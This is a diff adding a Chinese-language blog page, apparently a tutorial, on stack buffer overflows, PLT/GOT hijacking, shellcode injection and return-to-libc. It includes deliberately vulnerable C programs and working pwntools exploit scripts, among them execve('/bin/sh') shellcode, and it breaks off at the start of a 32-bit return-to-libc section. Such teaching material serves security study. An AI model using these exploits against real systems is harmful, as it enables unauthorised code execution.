@@ -1,0 +1,1229 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x10文件描述符简介 文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。但是文件描述符这一概念往往只适用于UNIX、Linux这样的操作系统。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Buffer overflow">
+<meta property="og:url" content="http://yoursite.com/2019/03/09/Buffer-overflow/index.html">
+<meta property="og:site_name" content="重明">
+<meta property="og:description" content="0x10文件描述符简介 文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。但是文件描述符这一概念往往只适用于UNIX、Linux这样的操作系统。">
+<meta property="og:image" content="http://yoursite.com/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5Cpic.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C11.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C2.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C3.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C4.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C6.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C7.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C8.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C9.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C10.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C12.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C5.png">
+<meta property="article:published_time" content="2019-03-09T11:54:50.000Z">
+<meta property="article:modified_time" content="2020-02-23T10:05:13.935Z">
+<meta property="article:author" content="ChongMing">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5Cpic.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/09/Buffer-overflow/"/>
+
+
+
+
+
+  <title>Buffer overflow | 重明</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">重明</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/09/Buffer-overflow/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ChongMing">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="重明">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Buffer overflow</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-09T19:54:50+08:00">
+                2019-03-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Binary/" itemprop="url" rel="index">
+                    <span itemprop="name">Binary</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="0x10文件描述符简介"><a href="#0x10文件描述符简介" class="headerlink" title="0x10文件描述符简介"></a>0x10文件描述符简介</h4><blockquote>
+<p>文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向<a href="https://zh.wikipedia.org/wiki/%E5%86%85%E6%A0%B8" target="_blank" rel="noopener">内核</a>为每一个<a href="https://zh.wikipedia.org/wiki/%E8%BF%9B%E7%A8%8B" target="_blank" rel="noopener">进程</a>所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在<a href="https://zh.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1" target="_blank" rel="noopener">程序设计</a>中，一些涉及底层的程序编写往往会围绕着文件描述符展开。但是文件描述符这一概念往往只适用于<a href="https://zh.wikipedia.org/wiki/UNIX" target="_blank" rel="noopener">UNIX</a>、<a href="https://zh.wikipedia.org/wiki/Linux" target="_blank" rel="noopener">Linux</a>这样的操作系统。</p>
+</blockquote>
+<a id="more"></a>
+
+<ul>
+<li><strong>思想</strong></li>
+</ul>
+<p><code>Linux</code>很重要的设计思想就是一切皆文件，网络是文件，键盘等外设也是文件，于是所有资源都有了统一的接口，开发者可以像写文件那样通过网络传输数据。</p>
+<p>内核给每个访问的文件分配了文件描述符(File Descriptor),它本质是一个非负整数，在打开或新建文件时返回，以后读写文件都要通过这个文件描述符。</p>
+<ul>
+<li><strong>应用</strong></li>
+</ul>
+<p><code>Linux</code>在实现时这个<strong>FD</strong>其实是一个索引值，指向每个进程打开文件的记录表。</p>
+<p><strong>POSIX</strong>已经定义了<strong>STDIN_FILENO</strong>、<strong>STDOUT_FILENO</strong>和<strong>STDERR_FILENO</strong>三个常量，也就是<strong>0</strong>、<strong>1</strong>、<strong>2</strong>。这三个文件描述符是每个进程都有的，这也解释了为什么每个进程都有编号为<strong>0</strong>、<strong>1</strong>、<strong>2</strong>的文件而不会与其他进程冲突。</p>
+<p>文件描述符帮助应用找到这个文件，而文件的打开模式等上下文信息存储在文件对象中，这个对象直接与文件描述符关联。</p>
+<p>即意味着</p>
+<ol>
+<li>每个文件描述符会与一个打开的文件相对应</li>
+<li>不同的文件描述符也可指向同一个文件</li>
+<li>相同的文件可以被不同的进程打开，也可以在同一个进程被多次打开</li>
+</ol>
+<h4 id="0x20栈溢出"><a href="#0x20栈溢出" class="headerlink" title="0x20栈溢出"></a>0x20栈溢出</h4><p>计算机程序的运行依赖于函数调用栈。栈溢出是指在栈内写入超出长度限制的数据，从而破坏程序运行甚至获得系统控制权的攻击手段。</p>
+<p>为了实现栈溢出，要满足俩个条件。</p>
+<blockquote>
+<p><strong>程序要有向栈内写入数据的行为</strong></p>
+<p><strong>程序并不限制写入数据的长度</strong></p>
+</blockquote>
+<ul>
+<li><strong>函数调用栈</strong></li>
+</ul>
+<p>函数调用栈是指程序运行时内存的一段连续的区域，用来保存函数运行时的状态信息。包括<strong>函数参数与局部变量等</strong>。发生函数调用时，调用函数(caller)的状态被保存在栈内，被调用函数(callee)的状态被压入调用栈的栈顶；在函数调用结束后，栈顶的函数状态被弹出，栈顶恢复到调用函数的状态。<strong>即每次调用一个函数时，栈就会增长；从一个函数返回时，栈就会收缩。</strong>函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大。</p>
+<ul>
+<li><strong>函数调用发生和结束时调用栈的关系</strong></li>
+</ul>
+<p>函数状态主要涉及三个寄存器－－<font color=red><strong>esp，ebp，eip。</strong></font><strong>esp 用来存储函数调用栈的栈顶地址</strong>，在压栈和退栈时发生变化。<strong>ebp 用来存储当前函数状态的基地址</strong>，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。<strong>eip 用来存储即将执行的程序指令的地址</strong>，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p>
+<ul>
+<li><strong>栈溢出攻击</strong></li>
+</ul>
+<p>当函数正在执行内部指令的过程中我们无法拿到程序的控制权，只有在发生函数调用或者结束函数调用时，程序的控制权会在函数状态之间发生跳转，这时才可以通过修改函数状态来实现攻击。而控制程序执行指令最关键的寄存器就是<strong>eip</strong>，所以我们的目标就是<strong>让eip载入攻击指令的地址。</strong></p>
+<p>在退栈过程中，返回地址会被传给 <strong>eip</strong>，所以我们只需要让溢出数据用攻击指令的地址来覆盖返回地址就可以了。其次，我们可以在溢出数据内包含一段攻击指令，也可以在内存其他位置寻找可用的攻击指令。</p>
+<p><img src="%5Cimages%5CBuffer%5Cpic.jpg" alt="pic"></p>
+<ul>
+<li><font color=red><strong>核心目的是用攻击指令的地址来覆盖返回地址</strong></font></li>
+</ul>
+<p>在函数调用发生时，<strong>eip</strong>会指向源程序中的某个指定的函数，没有办法通过改写返回地址来控制，但是可以将原本指定的函数在调用时替换为其他函数。</p>
+<h4 id="0x30栈溢出练习"><a href="#0x30栈溢出练习" class="headerlink" title="0x30栈溢出练习"></a>0x30栈溢出练习</h4><h5 id="–通过栈溢出，使函数返回程序中的system-函数"><a href="#–通过栈溢出，使函数返回程序中的system-函数" class="headerlink" title="–通过栈溢出，使函数返回程序中的system()函数"></a><strong>–通过栈溢出，使函数返回程序中的<code>system()</code>函数</strong></h5><p><strong>Code:</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> s[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">read</span>(<span class="number">0</span>,s,<span class="number">128</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vul();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>因为数组长度为20，但是<code>read()</code>函数读取128字节，所以存在缓冲区溢出</p>
+<p>如果利用输入的字符覆盖返回地址之前的内存，可以将恶意代码的地址覆盖到返回地址，可以执行恶意代码,利用<code>gdb</code>调试程序找到<strong>基地址与返回地址</strong>，相减可以得到需要覆盖掉的字符数.</p>
+<p>编译：<code>gcc -m32 vul.c -o vul -fno-stack-protector -no-pie</code>需要关闭栈溢出保护且PIE能使程序像共享库一样在主存任何位置装载，这需要将程序编译成位置无关，并链接为ELF共享对象。</p>
+<p><img src="%5Cimages%5CBuffer%5C11.png" alt="11"></p>
+<p>同理可以找到返回地址：</p>
+<p><img src="%5Cimages%5CBuffer%5C2.png" alt="2"></p>
+<p>相减就可以得到需要覆盖的字符数：</p>
+<p><img src="%5Cimages%5CBuffer%5C3.png" alt="3"></p>
+<p>将返回地址修改为<strong>system()</strong>函数的地址<a href="https://blog.csdn.net/favory/article/details/4441361" target="_blank" rel="noopener">(了解大端存储与小端存储)</a></p>
+<p><strong>payload：</strong><code>padding+address of ret</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">'./vul'</span>)</span><br><span class="line"><span class="comment">#io=remote('192.168.233.23',10001)  对远程利用</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">44</span>+<span class="string">'\x72\x91\x04\x08'</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>然后执行python脚本，反弹shell执行命令</p>
+<p><img src="%5Cimages%5CBuffer%5C4.png" alt="4"></p>
+<h5 id="–修改某个被调用函数的地址，让其指向另一个函数（hijack-GOT）"><a href="#–修改某个被调用函数的地址，让其指向另一个函数（hijack-GOT）" class="headerlink" title="–修改某个被调用函数的地址，让其指向另一个函数（hijack GOT）"></a><strong>–修改某个被调用函数的地址，让其指向另一个函数</strong>（<strong>hijack GOT</strong>）</h5><ul>
+<li><strong>PLT表和GOT表</strong></li>
+</ul>
+<p>程序对外部函数的调用需要在生成可执行文件时将外部函数链接到程序中，链接的方式分为静态链接和动态链接。静态链接得到的可执行文件包含外部函数的全部代码，动态链接得到的可执行文件并不包含外部函数的代码，而是在运行时将动态链接库（若干外部函数的集合）加载到内存的某个位置，再在发生调用时去链接库定位所需的函数。</p>
+<p>程序在链接库内定位到所需函数时，这个过程需要用到两张表–<strong>PLT和GOT</strong>。<strong>GOT表（全局偏移表Global Offset Table），用来储存外部很熟在内存的确切地址。</strong>GOT存储在<font color=red><strong>数据段(Data Segment)</strong></font>，可以在程序运行中被修改。<strong>PLT表（程序链接表Procedure Linkage Table）</strong>，用来存储外部很熟的入口点<strong>（entry）</strong>，即程序到<strong>PLT</strong>这里寻找外部函数的地址。PLT存储在<font color=red><strong>代码段(Code Segment)</strong></font>内，在运行之前就已经确定且不会被修改，所以b不会知道程序运行时动态链接库被加载的确切位置。那么<strong>PLT</strong>表内存储的入口点是<strong>GOT</strong>表中对应条目的地址。</p>
+<p><img src="%5Cimages%5CBuffer%5C6.png" alt="6"></p>
+<p>外部函数的内存地址存储在 <strong>GOT</strong> 而非 <strong>PLT</strong> 表内，<strong>PLT</strong> 存储的入口点又指向 <strong>GOT</strong> 的对应条目。</p>
+<p><strong>GOT</strong> 表的初始值都指向 <strong>PLT</strong> 表对应条目中的某个片段，这个片段的作用是调用一个函数地址解析函数。当程序需要调用某个外部函数时，首先到 <strong>PLT</strong> 表内寻找对应的入口点，跳转到 <strong>GOT</strong> 表中。如果这是第一次调用这个函数，程序会通过 <strong>GOT</strong> 表再次跳转回 <strong>PLT</strong> 表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉 <strong>GOT</strong> 表的初始值，之后再执行函数调用。当再次调用这个函数时，程序仍然首先通过 <strong>PLT</strong> 表跳转到 <strong>GOT</strong> 表，此时 <strong>GOT</strong> 表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。</p>
+<p><strong>第一次调用函数时解析函数地址并存入GOT表</strong></p>
+<p><img src="%5Cimages%5CBuffer%5C7.png" alt="7"></p>
+<p><strong>再次调用函数时直接读取GOT内的地址</strong></p>
+<p><img src="%5Cimages%5CBuffer%5C8.png" alt="8"></p>
+<p>如果实现函数的伪装，那就是到 <strong>GOT</strong> 表中将函数 A 的地址修改为函数 B 的地址。这样在后面所有对函数 A 的调用都会执行函数 B。</p>
+<p>即确定函数 A 在 GOT 表中的条目位置，确定函数 B 在内存中的地址，将函数 B 的地址写入函数 A 在 GOT 表中的条目。</p>
+<p><strong>Code:</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> s[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">read</span>(<span class="number">0</span>,s,<span class="number">128</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vul();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>payload：</strong><code>padding+address of read_plt+address of read_plt+parameter of read(0,address of read_got,4)</code></p>
+<p><img src="%5Cimages%5CBuffer%5C9.png" alt="9"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">'./vul'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">44</span>+<span class="string">'\x30\x90\x04\x08'</span>+<span class="string">'\x30\x90\x04\x08'</span>+<span class="string">'\x00\x00\x00\x00'</span>+<span class="string">'\x0c\xc0\x04\x08'</span>+<span class="string">'\x04\x00\x00\x00'</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(<span class="string">'\x72\x91\x04\x08'</span>) <span class="comment">#address of shell</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>执行payload，反弹shell</strong></p>
+<p><img src="%5Cimages%5CBuffer%5C10.png" alt="10"></p>
+<h5 id="–修改返回地址，让其指向溢出数据中的一段指令（shellcode）"><a href="#–修改返回地址，让其指向溢出数据中的一段指令（shellcode）" class="headerlink" title="–修改返回地址，让其指向溢出数据中的一段指令（shellcode）"></a>–修改返回地址，让其指向溢出数据中的一段指令（<strong>shellcode</strong>）</h5><p>在溢出的数据内包含一段指令，用攻击指令的起始地址覆盖掉返回地址。攻击指令一般都是用来打开<code>shell</code>。<code>shellcode</code>可以在网上搜索</p>
+<p>前提：函数调用栈上的数据要有可执行的权限以及关闭内存布局随机化</p>
+<ul>
+<li>BSS段通常是指用来存放程序中未初始化的或者初始化为0的<a href="https://baike.baidu.com/item/%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F/4725296" target="_blank" rel="noopener">全局变量</a>和<a href="https://baike.baidu.com/item/%E9%9D%99%E6%80%81%E5%8F%98%E9%87%8F/10997955" target="_blank" rel="noopener">静态变量</a>的一块内存区域。特点是可读写的，在程序执行之前BSS段会自动清0。可执行程序包括BSS段、<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E6%AE%B5" target="_blank" rel="noopener">数据段</a>、<a href="https://baike.baidu.com/item/%E4%BB%A3%E7%A0%81%E6%AE%B5" target="_blank" rel="noopener">代码段</a>（也称文本段）。</li>
+</ul>
+<p><strong>Code:</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, s, <span class="number">128</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vul();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用read_plt函数将函数的返回地址覆盖为BSS段的地址。</p>
+<p><strong>payload：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./vul"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./vul"</span>)</span><br><span class="line">read_plt = elf.plt[<span class="string">"read"</span>]</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">"a"</span>*<span class="number">44</span></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(<span class="number">0x0804C020</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x0804C020</span>)</span><br><span class="line">payload += p32(<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.send(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h5 id="–修改返回地址，让其指向内存中已有的某个函数（return2libc）"><a href="#–修改返回地址，让其指向内存中已有的某个函数（return2libc）" class="headerlink" title="–修改返回地址，让其指向内存中已有的某个函数（return2libc）"></a>–修改返回地址，让其指向内存中已有的某个函数（<strong>return2libc</strong>）</h5><p>在内存中确定某个函数的地址，并用其覆盖掉返回地址。由于<strong>libc</strong>动态链接库中的函数被广泛使用，所以有很大概率可以在内存中找到该动态库。同时由于该库包含了一些系统级的函数（例如<strong>system()</strong>等），所以通常使用这些系统级函数来获得当前进程的控制权。鉴于要执行的函数可能需要参数，比如调用 <strong>system()</strong> 函数打开 <strong>shell</strong> 的完整形式为 <strong>system(“/bin/sh”)</strong> ，所以溢出数据也要包括必要的参数。</p>
+<p><img src="%5Cimages%5CBuffer%5C12.png" alt="12"></p>
+<ul>
+<li><strong>system()函数的地址</strong></li>
+</ul>
+<p>当函数被动态链接至程序中，程序在运行时首先确定动态链接库在内存的起始地址，再加上函数在动态库中的相对偏移量，最终得到函数在内存的绝对地址。如果操作系统打开了 <strong>ASLR</strong>，程序每次运行时动态库的起始地址都会变化，也就无从确定库内函数的绝对地址。在 <strong>ASLR</strong> 被关闭的前提下，我们可以通过调试工具在运行程序过程中直接查看 <strong>system()</strong> 的地址，也可以查看动态库在内存的起始地址，再在动态库内查看函数的相对偏移位置，通过计算得到函数的绝对地址。</p>
+<p><strong>Code(32位）：</strong></p>
